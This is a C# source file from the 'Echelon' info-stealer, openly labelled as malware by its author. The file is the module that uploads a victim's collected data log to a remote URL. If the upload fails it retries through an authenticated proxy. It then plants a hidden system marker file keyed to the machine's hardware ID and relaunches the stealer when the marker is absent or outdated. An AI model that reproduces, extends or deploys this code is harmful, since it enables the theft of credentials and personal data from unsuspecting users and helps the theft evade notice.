///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace System.Net
{
    using System.Security.Authentication;
    public static class SecurityProtocolTypeExtensions
    {
        public const SecurityProtocolType Tls12 = (SecurityProtocolType)SslProtocolsExtensions.Tls12;
        public const SecurityProtocolType Tls11 = (SecurityProtocolType)SslProtocolsExtensions.Tls11;
        public const SecurityProtocolType SystemDefault = (SecurityProtocolType)0;
    }
}

namespace System.Security.Authentication
{
    public static class SslProtocolsExtensions
    {
        public const SslProtocols Tls12 = (SslProtocols)0x00000C00;
        public const SslProtocols Tls11 = (SslProtocols)0x00000300;
    }
}

namespace Echelon
{
    public class SenderAPI
    {
        public static void POST(byte[] file, string filename, string contentType, string url)
        {
            try
            {
                try
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolTypeExtensions.Tls11 | SecurityProtocolTypeExtensions.Tls12;
                    WebClient webClient = new WebClient
                    {
                        Proxy = null //Не используем
                    };

                    string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                    webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                    string @string = webClient.Encoding.GetString(file);
                    string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                    {

                    text,
                    filename,
                    contentType,
                    @string
                    });
                    byte[] bytes = webClient.Encoding.GetBytes(s);
                    webClient.UploadData(url, "POST", bytes);
                    //Записываем HWID в файл, означает что лог с данного ПК уже отправлялся и больше слать его не надо.
                    File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
                    //Скрываем
                    File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
                }
                catch
                {

                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolTypeExtensions.Tls11 | SecurityProtocolTypeExtensions.Tls12;

                    using (var webClient = new WebClient())
                    {
                        string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                        string @string = webClient.Encoding.GetString(file);
                        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                        {

                    text,
                    filename,
                    contentType,
                    @string
                        });
                        byte[] bytes = webClient.Encoding.GetBytes(s);
                        var proxy = new WebProxy(Program.ip, Program.port) // IP Proxy
                        {
                            Credentials = new NetworkCredential(Program.login, Program.password) // Логин и пароль Proxy
                        };
                        webClient.Proxy = proxy;
                        webClient.UploadData(url, "POST", bytes);
                    }
                    //Записываем HWID в файл, означает что лог с данного ПК уже отправлялся и больше слать его не надо.
                    File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
                    //Скрываем
                    File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);

                }

                finally

                {

                    // Проверка файла Help.HWID
                    if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
                    {
                        // Снова запускаем стиллер
                        Collection.GetCollection();
                    }

                    else
                    {
                        // Файл Help.HWID есть, проверяем записанную в нем дату
                        if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
                        {
                            // Дата в файле Help.HWID отличается от сегодняшней, запускаем стиллер
                            Collection.GetCollection();
                        }
                        else
                        {

                        }

                    }
                }

            }
            catch

            {
                if (File.Exists(Help.LocalData + "\\" + Help.HWID))
                {
                    File.Delete(Help.LocalData + "\\" + Help.HWID);
                }

                else
                {

                    return;
                }

            }
            return;

        }
    }
}
